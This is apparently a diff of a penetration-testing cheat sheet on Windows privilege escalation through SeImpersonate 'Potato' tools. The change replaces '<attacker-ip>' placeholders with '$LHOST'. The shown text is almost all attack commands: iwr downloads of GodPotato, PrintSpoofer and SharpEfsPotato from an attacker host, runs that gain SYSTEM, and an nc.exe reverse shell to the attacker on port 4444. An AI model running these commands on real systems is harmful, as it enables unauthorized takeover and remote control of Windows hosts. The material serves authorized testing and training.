@@ -34,15 +34,15 @@ whoami /priv | findstr /i "SeImpersonate"
 Most reliable modern Potato, no Print Spooler, no DNS requirement, works across all current Windows versions where SeImpersonate is held.
 
 ```powershell
-iwr http://<attacker-ip>/GodPotato.exe -OutFile C:\Temp\GodPotato.exe
+iwr http://$LHOST/GodPotato.exe -OutFile C:\Temp\GodPotato.exe
 C:\Temp\GodPotato.exe -cmd "cmd /c whoami"
-C:\Temp\GodPotato.exe -cmd "C:\Temp\nc.exe <attacker-ip> 4444 -e cmd.exe"
+C:\Temp\GodPotato.exe -cmd "C:\Temp\nc.exe $LHOST 4444 -e cmd.exe"
 ```
 
 ### PrintSpoofer (Windows 10 1809+ / Server 2019, requires Spooler)
 
 ```powershell
-iwr http://<attacker-ip>/PrintSpoofer.exe -OutFile C:\Temp\PrintSpoofer.exe
+iwr http://$LHOST/PrintSpoofer.exe -OutFile C:\Temp\PrintSpoofer.exe
 C:\Temp\PrintSpoofer.exe -i -c cmd
 ```
 
@@ -51,7 +51,7 @@ C:\Temp\PrintSpoofer.exe -i -c cmd
 Fallback when Spooler is disabled. Abuses EFSRPC.
 
 ```powershell
-iwr http://<attacker-ip>/SharpEfsPotato.exe -OutFile C:\Temp\SharpEfsPotato.exe
+iwr http://$LHOST/SharpEfsPotato.exe -OutFile C:\Temp\SharpEfsPotato.exe
 C:\Temp\SharpEfsPotato.exe -p cmd.exe -a "/c whoami"
 ```
 
